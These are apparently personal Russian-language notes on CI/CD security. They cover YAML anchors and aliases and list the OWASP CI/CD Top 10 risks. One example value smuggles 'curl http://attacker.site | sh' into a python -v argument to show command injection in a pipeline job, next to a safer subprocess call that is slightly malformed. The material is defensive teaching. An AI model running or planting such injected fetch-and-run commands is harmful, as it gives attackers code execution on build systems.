https://owasp.org/www-project-top-10-ci-cd-security-risks/
https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html

### Anchors и Aliases 
Anchor (&): Создает "ссылку" на фрагмент данных в YAML-файле (например, &my_anchor some value).
Alias (*): Использует ранее созданную ссылку для копирования ее значения (например, *my_anchor).

### Python -v в CI/CD
```
USER_INPUT="my_script.py; curl http://attacker.site | sh"
python -v $USER_INPUT

# уязвимый пример CI CD
run_debug:
  script:
    - python -v $DEBUG_SCRIPT

# Безопасно
import subprocess : subprocess.run([“python”, “-v”, script_name]) # Безопасное использование
```

CICD-SEC-1: Insufficient Flow Control Mechanisms
Наличие QG
Настройте правила защиты ветвей 
Запретите автоматический merge в main ветку

CICD-SEC-2: Inadequate Identity and Access Management
CICD-SEC-3: Dependency Chain Abuse
CICD-SEC-4: Poisoned Pipeline Execution (PPE)
CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)
CICD-SEC-6: Insufficient Credential Hygiene
CICD-SEC-7: Insecure System Configuration
CICD-SEC-8: Ungoverned Usage of Third-Party Services
CICD-SEC-9: Improper Artifact Integrity Validation

CICD-SEC-10: Insufficient Logging and Visibility

